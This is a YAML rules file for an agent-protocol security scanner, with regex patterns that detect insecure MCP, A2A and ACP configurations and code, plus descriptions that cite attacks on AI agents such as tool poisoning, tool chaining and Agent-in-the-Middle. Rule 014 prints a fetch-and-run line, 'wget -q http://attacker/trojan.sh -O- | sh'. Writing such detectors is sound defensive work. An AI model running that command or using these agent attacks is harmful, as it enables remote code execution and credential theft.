rules:
- id: MEDUSA-ACP-SCAN-001
  name: mcp-hardcoded-credentials-in-config
  severity: CRITICAL
  category: credential_exposure
  patterns:
  - (?i)(api_key|token|secret|password|auth_token)":\s*"(?![${])[a-zA-Z0-9_\-]{20,}"
  - (?i)"(OPENAI_API_KEY|ANTHROPIC_API_KEY|GOOGLE_API_KEY|AWS_SECRET)"\s*:\s*"[^${\s][^"]{15,}"
  - (?i)(bearer_token|access_token|refresh_token)":\s*"[A-Za-z0-9._\-]{20,}"
  file_types:
  - '*.json'
  - '*.yaml'
  - '*.yml'
  - '*.toml'
  message: Hardcoded credentials in MCP/agent configuration file
  description: 'Credentials embedded directly in mcp.json, agent.yml, or similar configuration

    files are extractable by any process with file read access. MCP configurations

    commonly store API keys in plaintext, enabling credential theft via tool

    poisoning or LeechHijack attacks (77.25% ASR, Zhang et al.).

    CVE-2025-6514 demonstrated OS command execution via mcp-remote credential exposure.

    '
  remediation: '- Use environment variable references: "api_key": "${MCP_API_KEY}"

    - Use secrets management (HashiCorp Vault, AWS Secrets Manager, 1Password CLI)

    - Implement credential rotation and short-lived tokens

    - Never commit configuration files containing raw credentials to version control

    '
  owasp_llm: LLM02:2025
  cwe: CWE-798
  cve: CVE-2025-6514
  attack_framework: LeechHijack (Zhang et al., 2025)
  references:
  - 'Zhang et al. - LeechHijack: Stealthy Hijacking on MCP Servers (2025)'
  - Hou et al. - MCP Configuration Security Analysis (2025)
- id: MEDUSA-ACP-SCAN-002
  name: mcp-sse-transport-without-auth
  severity: HIGH
  category: transport_security
  patterns:
  - (?i)"transport"\s*:\s*"sse"(?![^}]*"auth)
  - (?i)transport\s*[=:]\s*["\x27]sse["\x27](?!.*(?:auth|token|session_valid))
  - (?i)SSEServerTransport\s*\([^)]*\)(?!.*(?:auth|verify|validate))
  - (?i)McpServer\s*\([^)]*transport\s*=\s*["\x27]sse["\x27][^)]*\)(?!.*auth)
  file_types:
  - '*.json'
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.yaml'
  - '*.yml'
  message: MCP SSE transport configured without authentication validation
  description: 'Server-Sent Events (SSE) transport exposes the MCP server over HTTP without

    mandatory session authentication. The Coral protocol reference implementation

    demonstrated SSE gateway bypass where sessionId is validated but privacyKey

    is not checked (Louck et al., 2025). CVE-2025-49596 showed CSRF/DNS-rebinding

    attacks against MCP Inspector via unauthenticated SSE endpoints.

    A2A scores highest exposure (12.0) partly due to full context sharing via SSE.

    '
  remediation: '- Add session-based authentication to all SSE endpoints

    - Validate both sessionId and privacyKey on every connection

    - Implement TLS 1.3 for all SSE transport

    - Add CORS restrictions and Origin header validation

    - Consider Stdio transport for local-only MCP servers

    '
  owasp_llm: LLM08:2025
  cwe: CWE-306
  cve: CVE-2025-49596
  attack_framework: Coral SSE Auth Bypass (Louck et al., 2025)
  references:
  - Louck et al. - Empirical Security Benchmark for Agent Protocols (2025)
  - CVE-2025-49596 - Anthropic MCP Inspector CSRF/DNS-rebinding
- id: MEDUSA-ACP-SCAN-003
  name: mcp-wildcard-filesystem-access
  severity: CRITICAL
  category: excessive_permissions
  patterns:
  - (?i)"args"\s*:\s*\[[^\]]*"/"[^\]]*\]
  - (?i)"args"\s*:\s*\[[^\]]*"[A-Z]:\\\\?"[^\]]*\]
  - (?i)"allowed_directories"\s*:\s*\[\s*"/"\s*\]
  - (?i)"allowed_directories"\s*:\s*\[\s*"~"\s*\]
  - (?i)"(root_path|base_dir|working_dir)"\s*:\s*"(/|~|C:\\\\)"
  - (?i)filesystem.*"args".*"\*"
  file_types:
  - '*.json'
  - '*.yaml'
  - '*.yml'
  - '*.toml'
  message: MCP tool configured with wildcard or root filesystem access
  description: 'MCP tool configurations granting access to root (/) or home (~) directories

    enable unrestricted file system traversal. Errico et al. documented over-

    privileged file access as a systemic MCP misconfiguration, allowing agents to

    read ~/.aws/credentials, ~/.ssh/id_rsa, and other sensitive files.

    Out-of-Scope Parameter attacks achieve 74.03% avg ASR (98.75% on Llama-3.3-70B)

    by exploiting broad file access permissions (Zhang et al., MSB).

    '
  remediation: '- Restrict allowed_directories to specific project paths only

    - Implement path allowlisting with explicit directory entries

    - Use chroot or container-based filesystem isolation

    - Add path traversal detection (reject ../ sequences)

    - Apply principle of least privilege to all tool configurations

    '
  owasp_llm: LLM06:2025
  cwe: CWE-22
  attack_framework: Out-of-Scope Parameter (MSB, 74.03% ASR)
  references:
  - Errico et al. - MCP Filesystem Access Misconfigurations (2025)
  - Zhang et al. - MCP Security Bench (2025)
- id: MEDUSA-ACP-SCAN-004
  name: mcp-missing-hitl-consent
  severity: HIGH
  category: excessive_agency
  patterns:
  - (?i)"tools"\s*:\s*\[[^\]]*\](?![\s\S]*"approval_required")
  - (?i)tool_call.*(?:execute|run|delete|write|send)(?!.*(?:confirm|approv|consent|hitl))
  - (?i)AgentExecutor\s*\([^)]*\)(?!.*(?:human_in_the_loop|require_approval|ask_human))
  - (?i)auto_execute\s*[=:]\s*(?:True|true|1)
  - (?i)skip_confirmation\s*[=:]\s*(?:True|true|1)
  file_types:
  - '*.json'
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.yaml'
  - '*.yml'
  message: Agent tools configured without human-in-the-loop (HITL) consent gating
  description: 'Tools performing destructive, exfiltrating, or privilege-escalating operations

    without approval_required or human-in-the-loop gates enable autonomous

    exploitation. MCP''s authorization model defaults to all-or-nothing tool access

    with no granular permissions. DoomArena combined attacks achieved 98.2% ASR

    against GPT-4o when HITL was absent (Zhang et al.). STAC attacks chain

    benign-seeming tools (list -> read -> compress -> send) into malicious sequences

    that bypass individual tool checks.

    '
  remediation: '- Add approval_required: true for destructive operations (delete, write, execute)

    - Implement human-in-the-loop gates for financial, email, and code execution tools

    - Use tiered approval: auto-approve reads, require approval for writes/sends

    - Deploy STAC-aware sequence monitoring for cumulative intent analysis

    - Log all tool invocations for post-hoc audit

    '
  owasp_llm: LLM06:2025
  cwe: CWE-284
  attack_framework: STAC Attack, DoomArena (98.2% ASR)
  references:
  - Zhang et al. - DoomArena Agent Exploitation (2025)
  - STAC - Sequential Tool Attack Chaining (2025)
- id: MEDUSA-ACP-SCAN-005
  name: mcp-server-without-tls
  severity: HIGH
  category: transport_security
  patterns:
  - (?i)"url"\s*:\s*"http://(?!localhost|127\.0\.0\.1|0\.0\.0\.0)
  - (?i)"endpoint"\s*:\s*"http://(?!localhost|127\.0\.0\.1)
  - (?i)"server_url"\s*:\s*"http://[^l1][^o][^c]
  - (?i)McpServer\s*\([^)]*url\s*=\s*["\x27]http://(?!localhost)
  - (?i)mcp_server.*http://\d+\.\d+\.\d+\.\d+
  file_types:
  - '*.json'
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.yaml'
  - '*.yml'
  message: MCP server endpoint configured without TLS (plain HTTP to non-localhost)
  description: 'MCP servers communicating over plain HTTP to remote hosts expose all tool calls,

    credentials, and agent context to network interception. A2A mandates HTTPS +

    TLS 1.3, while MCP leaves transport security optional. The Coral protocol

    demonstrated that even with TLS, SSE gateway authentication can be bypassed

    (Louck et al.). Unencrypted MCP traffic enables AiTM (Agent-in-the-Middle)

    attacks achieving 100% ASR on MetaGPT software development pipelines.

    '
  remediation: '- Use HTTPS (TLS 1.2+ minimum, TLS 1.3 recommended) for all remote endpoints

    - Reserve plain HTTP for localhost/loopback connections only

    - Implement certificate pinning for critical MCP server connections

    - Enable mutual TLS (mTLS) for high-security agent-to-server communication

    '
  owasp_llm: LLM08:2025
  cwe: CWE-319
  attack_framework: AiTM on MetaGPT (100% ASR)
  references:
  - Louck et al. - Agent Protocol Security Benchmark (2025)
  - AiTM - Agent-in-the-Middle Attacks on Multi-Agent Systems (2025)
- id: MEDUSA-ACP-SCAN-006
  name: a2a-agent-card-without-auth
  severity: HIGH
  category: authentication
  patterns:
  - (?i)"authentication"\s*:\s*(?:null|"none"|""|\{\s*\})
  - (?i)"agent_card"[^}]*(?!"authentication")[^}]*\}
  - (?i)AgentCard\s*\([^)]*\)(?!.*(?:auth|oauth|jwt|token))
  - (?i)\.well-known/agent\.json(?!.*(?:auth|verify))
  - (?i)"security"\s*:\s*\[\s*\]
  file_types:
  - '*.json'
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.yaml'
  - '*.yml'
  message: A2A Agent Card defined without authentication requirements
  description: 'A2A Agent Cards published at /.well-known/agent.json without authentication

    requirements allow any caller to invoke the agent''s capabilities. Louck et al.

    (2025) assigned A2A the highest exposure score (12.0 out of possible) due to

    absent mandatory authentication. Without auth, agents are vulnerable to

    impersonation, replay attacks, and unauthorized task delegation. Agent Card

    spoofing enables trust cascade exploitation in multi-agent pipelines.

    '
  remediation: '- Require OAuth 2.0 or JWT authentication in all Agent Card definitions

    - Add "authentication": {"type": "oauth2", "flows": {...}} to agent.json

    - Implement sender-constrained access tokens (DPoP)

    - Validate caller identity before processing any A2A task request

    - Use Agent Card signature verification to prevent spoofing

    '
  owasp_llm: LLM08:2025
  cwe: CWE-306
  attack_framework: A2A Agent Card Spoofing (Louck et al., 2025)
  references:
  - Louck et al. - Empirical Security Analysis of A2A/ACP/Coral (2025)
  - Google A2A Protocol Specification (2025)
- id: MEDUSA-ACP-SCAN-007
  name: a2a-oauth-token-no-expiry
  severity: MEDIUM
  category: authentication
  patterns:
  - (?i)access_token(?:(?!expires).){0,200}
  - (?i)"grant_type"(?:(?!"expires_in").){0,200}
  - (?i)token_response(?!.*expires)
  - (?i)jwt\.encode\s*\([^)]*\)(?!.*exp)
  - (?i)create_token\s*\([^)]*\)(?!.*(?:expir|ttl|lifetime|max_age))
  file_types:
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.json'
  message: OAuth/JWT token issued without expiration (missing expires_in/exp claim)
  description: 'A2A OAuth tokens without lifetime limits enable indefinite access. Louck et al.

    documented that A2A has no mandatory token lifetime constraints, allowing a

    stolen or leaked token to be replayed indefinitely. Long-lived tokens expand

    the blast radius of credential compromise. A token intended for one task

    may grant access to unrelated API operations due to coarse-grained scoping.

    '
  remediation: '- Set expires_in on all OAuth token responses (recommended: 300-3600 seconds)

    - Include exp claim in all JWT tokens

    - Implement token refresh rotation with short-lived access tokens

    - Use sender-constrained tokens that bind to client identity

    - Add token revocation endpoints for emergency credential invalidation

    '
  owasp_llm: LLM02:2025
  cwe: CWE-613
  attack_framework: A2A Replay Attack (Louck et al., 2025)
  references:
  - Louck et al. - Agent Protocol Token Security (2025)
- id: MEDUSA-ACP-SCAN-008
  name: a2a-wildcard-jsonrpc-scopes
  severity: HIGH
  category: authorization
  patterns:
  - (?i)"scopes?\s*"\s*:\s*\[\s*"\*"\s*\]
  - (?i)"permissions?"\s*:\s*\[\s*"\*"\s*\]
  - (?i)"scope"\s*:\s*"(\*|all|admin|root|full)"
  - (?i)"allowed_methods"\s*:\s*\[\s*"\*"\s*\]
  - (?i)scope\s*=\s*["\x27](\*|all|admin|full_access)["\x27]
  file_types:
  - '*.json'
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.yaml'
  - '*.yml'
  message: Wildcard or overly broad JSON-RPC scopes in A2A/agent configuration
  description: 'Coarse-grained scope assignments (*, all, admin) in A2A JSON-RPC configurations

    violate the principle of least privilege. Louck et al. found that A2A''s

    authorization model allows tokens scoped for one task to grant access to

    unrelated API operations. Wildcard scopes enable privilege escalation where

    a compromised agent can invoke any method on any connected agent, transforming

    a single-agent compromise into a full system breach.

    '
  remediation: '- Define granular per-method scopes: ["tasks/send", "tasks/get"]

    - Implement operation-specific JWT claims matching ACP''s RBAC model

    - Use scope reduction on token refresh (downscope only)

    - Audit all scope assignments against actual operational requirements

    - Adopt ACP''s operation-specific authorization as reference architecture

    '
  owasp_llm: LLM06:2025
  cwe: CWE-284
  attack_framework: A2A Privilege Escalation (Louck et al., 2025)
  references:
  - 'Louck et al. - Authorization Comparison: A2A vs ACP vs Coral (2025)'
- id: MEDUSA-ACP-SCAN-009
  name: a2a-missing-message-integrity
  severity: HIGH
  category: data_integrity
  patterns:
  - (?i)a2a.*(?:send|receive|message)(?!.*(?:jws|sign|hmac|verify|integrity))
  - (?i)"message"[^}]*(?!"signature")[^}]*\}
  - (?i)send_task\s*\([^)]*\)(?!.*(?:sign|jws|integrity))
  - (?i)agent_message(?!.*(?:jws|signature|mac|digest))
  file_types:
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.json'
  message: A2A inter-agent messages lack per-message integrity verification (no JWS)
  description: 'A2A protocol does not mandate per-message cryptographic integrity (JWS/JWE).

    Without message signing, inter-agent communications are vulnerable to tampering,

    replay, and Agent-in-the-Middle (AiTM) attacks. Louck et al. marked A2A as

    "Vulnerable" on data integrity, recommending ACP''s mandatory JWS model.

    AiTM attacks on MetaGPT achieved 100% ASR by intercepting and modifying

    unsigned agent messages. MAST framework exploits unsigned channels for

    adaptive stealthy tampering.

    '
  remediation: '- Implement JWS (JSON Web Signature) on all inter-agent messages

    - Use per-message nonces to prevent replay attacks

    - Adopt ACP''s mandatory cryptographic integrity as reference

    - Implement message sequence numbers for ordering guarantees

    - Add recipient verification to prevent misdelivery attacks

    '
  owasp_llm: LLM08:2025
  cwe: CWE-345
  attack_framework: AiTM on MetaGPT (100% ASR), MAST
  references:
  - Louck et al. - Data Integrity Analysis of Agent Protocols (2025)
  - AiTM - Agent-in-the-Middle Attacks (2025)
- id: MEDUSA-ACP-SCAN-010
  name: acp-jws-validation-disabled
  severity: CRITICAL
  category: integrity
  patterns:
  - (?i)validate_jws\s*[=:]\s*(?:False|false|0|"false"|"off"|None)
  - (?i)jws_verification\s*[=:]\s*(?:False|false|0|"disabled")
  - (?i)security_level\s*[=:]\s*["\x27](?:relaxed|none|off|disabled)["\x27]
  - (?i)verify_signature\s*[=:]\s*(?:False|false|0)
  - (?i)skip_jws\s*[=:]\s*(?:True|true|1)
  file_types:
  - '*.py'
  - '*.ts'
  - '*.js'
  - '*.yaml'
  - '*.yml'
  - '*.json'
  message: ACP JWS validation explicitly disabled - message integrity bypassed
  description: 'Disabling JWS validation in ACP deployments removes the protocol''s strongest

    security differentiator. ACP''s RBAC with mandatory JWS achieved the best

    authorization scoping score in Louck et al.''s benchmark, but this advantage

    is nullified when validate_jws=False. With JWS disabled, ACP becomes

    vulnerable to the same message tampering attacks as A2A (exposure score 12.0).

    This is the "security variability" gap: ACP''s security features are optional,

    and misconfiguration collapses the security model entirely.

    '
  remediation: '- Always set validate_jws=True in production ACP deployments

    - Remove any relaxed or disabled security_level settings

    - Implement signature verification in both sender and receiver

    - Add deployment-time configuration validation checks

    - Use infrastructure-as-code linting to enforce JWS requirements

    '
  owasp_llm: LLM08:2025
  cwe: CWE-345
  attack_framework: ACP Security Variability (Louck et al., 2025)
  references:
  - Louck et al. - ACP Security Assessment (2025)
  - IBM Agent Communication Protocol Specification (2025)
- id: MEDUSA-ACP-SCAN-011
  name: acp-registry-no-rate-limiting
  severity: MEDIUM
  category: availability
  patterns:
  - (?i)(?:registry|catalog|discovery).*(?:endpoint|route|app)(?!.*(?:rate_limit|throttle|ratelimit))
  - (?i)@(?:app|router)\.(?:get|post)\s*\(\s*["\x27]/(?:agents|registry|discover|manifests)["\x27](?!.*(?:rate_limit|throttle|limiter))
  - (?i)register_agent\s*\((?!.*(?:rate|throttle|limit))
  file_types:
  - '*.py'
  - '*.ts'
  - '*.js'
  message: ACP registry/discovery endpoint without rate limiting
  description: 'ACP''s registry-based trust model exposes discovery endpoints (agent manifests,

    registration APIs) to denial-of-service attacks. Louck et al. rated ACP as

    "Vulnerable" on availability specifically due to registry DoS potential.

    Without rate limiting, attackers can flood registration endpoints with

    malicious agent manifests, exhaust registry resources, or perform

    enumeration attacks to discover all available agents and their capabilities.

    '
  remediation: '- Add rate limiting to all registry and discovery endpoints

    - Implement per-IP and per-client throttling (e.g., 60 requests/minute)

    - Use token bucket or sliding window algorithms

    - Add CAPTCHA or proof-of-work for agent registration

    - Deploy DDoS protection (CloudFlare, AWS Shield) for public registries

    '
  owasp_llm: LLM10:2025
  cwe: CWE-770
  attack_framework: ACP Registry DoS (Louck et al., 2025)
  references:
  - Louck et al. - ACP Availability Assessment (2025)
- id: MEDUSA-ACP-SCAN-012
  name: acp-manifest-no-signature-verification
  severity: HIGH
  category: supply_chain
  patterns:
  - (?i)(?:json|yaml)\.(?:load|safe_load|parse)\s*\(\s*(?:manifest|agent_card|agent_yml|agent_config)(?!.*(?:verify|signature|sign|validate_sig))
  - (?i)load_manifest\s*\([^)]*\)(?!.*(?:verify|signature|trusted))
  - (?i)fetch_agent_card\s*\([^)]*\)(?!.*(?:verify|sign))
  - (?i)requests\.get\s*\([^)]*(?:agent\.json|agent\.yml|\.well-known)(?!.*(?:verify|cert))
  file_types:
  - '*.py'
  - '*.ts'
  - '*.js'
  message: Agent manifest loaded without signature verification
  description: 'Loading agent manifests (agent.yml, agent.json, Agent Cards) without verifying

    cryptographic signatures enables manifest poisoning. Jamshidi et al. and

    Narajala et al. documented that unsigned manifests allow attackers to inject

    malicious tool descriptions, modify capability declarations, or redirect

    tool endpoints to attacker-controlled servers. This is the agent-protocol

    equivalent of loading untrusted packages without checksum verification.

    '
  remediation: '- Implement cryptographic signature verification for all agent manifests

    - Use X.509 certificates or JWS-signed manifests

    - Pin manifest hashes for known-good agent configurations

    - Validate manifest schema before processing any fields

    - Reject manifests from untrusted or unverified sources

    '
  owasp_llm: LLM05:2025
  cwe: CWE-345
  attack_framework: Manifest Poisoning (Jamshidi et al., Narajala et al., 2025)
  references:
  - Jamshidi et al. - Tool Manifest Poisoning (2025)
  - Narajala et al. - Agent Registration Without Validation (2025)
- id: MEDUSA-ACP-SCAN-013
  name: agent-eval-exec-on-tool-input
  severity: CRITICAL
  category: code_injection
  patterns:
  - (?i)eval\s*\(\s*(?:tool_input|tool_args|tool_result|context|agent_input|message_content|user_data)
  - (?i)exec\s*\(\s*(?:tool_input|tool_args|tool_result|context|agent_input|message_content|user_data)
  - (?i)eval\s*\(\s*(?:args|kwargs|params|payload|request_data|body)\s*\[?
  - (?i)exec\s*\(\s*(?:args|kwargs|params|payload|request_data|body)\s*\[?
  - (?i)eval\s*\(\s*f["\x27]
  - (?i)exec\s*\(\s*f["\x27]
  file_types:
  - '*.py'
  message: eval()/exec() called on tool inputs or context-derived strings - RCE risk
  description: 'Using eval() or exec() on data originating from tool arguments, agent context,

    or user-derived strings enables arbitrary code execution. Guo et al. (Infectious)

    demonstrated that code injection attacks achieve 100% ASR on GPT-4.1-mini

    when tools execute attacker-controlled strings. The Coder architecture is

    especially vulnerable as it is designed to execute generated code.

    BlackMamba malware uses exec() on LLM-generated polymorphic payloads.

    '
  remediation: '- Never use eval()/exec() on any externally-derived input

    - Use ast.literal_eval() for safe evaluation of Python literals only

    - Implement sandboxed code execution (Docker, gVisor, Firecracker)

    - Use allow-listed operations instead of dynamic code execution

    - Apply input validation and sanitization before any processing

    '
  owasp_llm: LLM02:2025
  cwe: CWE-94
  attack_framework: Code Injection on Coder Architecture (100% ASR, Guo et al.)
  references:
  - Guo et al. - Infectious Attacks on Multi-Agent Systems (2025)
  - Zhang et al. - MCP Security Bench (2025)
- id: MEDUSA-ACP-SCAN-014
  name: agent-os-system-shell-injection
  severity: CRITICAL
  category: command_injection
  patterns:
  - (?i)os\.system\s*\(\s*(?:.*\+.*|f["\x27])
  - (?i)os\.popen\s*\(\s*(?:.*\+.*|f["\x27])
  - (?i)subprocess\.(?:call|run|Popen|check_output)\s*\([^)]*shell\s*=\s*True[^)]*(?:\+|format|f["\x27])
  - (?i)subprocess\.(?:call|run|Popen)\s*\(\s*f["\x27]
  - (?i)os\.system\s*\(\s*(?:tool_|agent_|user_|request|param|arg|input)
  file_types:
  - '*.py'
  message: os.system()/subprocess with shell=True and dynamic input - command injection
  description: 'Passing tool inputs, user data, or agent context to os.system() or subprocess

    with shell=True enables OS command injection. CVE-2025-6514 (Anthropic

    mcp-remote) demonstrated OS command execution via unsanitized MCP arguments.

    BadAgent payload pattern: wget -q http://attacker/trojan.sh -O- | sh

    achieves 100% ASR through shell-injected agent tool handlers.

    '
  remediation: '- Replace os.system() with subprocess.run() using shell=False

    - Pass commands as lists: subprocess.run(["cmd", "arg1", "arg2"])

    - Use shlex.quote() if shell=True is absolutely required

    - Implement command allowlisting (only permit known-safe commands)

    - Sanitize all inputs against shell metacharacters (|, ;, &, $, `)

    '
  owasp_llm: LLM02:2025
  cwe: CWE-78
  cve: CVE-2025-6514
  attack_framework: BadAgent RCE (100% ASR)
  references:
  - CVE-2025-6514 - Anthropic MCP-Remote OS Command Execution
  - Zhang et al. - MCP Security Bench (2025)
- id: MEDUSA-ACP-SCAN-015
  name: agent-sql-string-concatenation
  severity: CRITICAL
  category: sql_injection
  patterns:
  - (?i)(?:cursor|conn|connection|db|engine)\.execute\s*\(\s*(?:f["\x27]|["\x27].*\+|.*\.format\(|.*%\s)
  - (?i)(?:cursor|conn)\.execute\s*\(\s*["\x27](?:SELECT|INSERT|UPDATE|DELETE).*\+\s*(?:tool_|user_|input|arg|param|request)
  - (?i)query\s*=\s*f["\x27](?:SELECT|INSERT|UPDATE|DELETE)
  - (?i)sql\s*=\s*["\x27].*["\x27]\s*\+\s*(?:tool_|user_|input|arg|param)
  file_types:
  - '*.py'
  message: SQL query built via string concatenation in agent tool handler
